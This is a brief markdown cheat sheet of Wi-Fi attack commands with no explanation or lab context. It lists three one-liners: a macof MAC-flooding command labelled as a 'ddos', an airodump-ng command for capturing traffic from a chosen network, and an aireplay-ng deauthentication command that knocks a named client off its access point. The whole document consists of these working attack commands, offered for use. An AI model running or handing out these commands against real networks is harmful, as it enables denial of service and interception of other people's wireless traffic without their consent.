# wifi

## wifi mac ddos

```
sudo macof -i wlan0 -s 192.168.1.1
```
## wifi intercape

```
airodump-ng wlan0 --bssid <bssid> -c <channel> 
```

## wifi deauto attack 

```
aireplay-ng --deauth 100 -a <wifi mac> -c <clint mac> wlan0
```
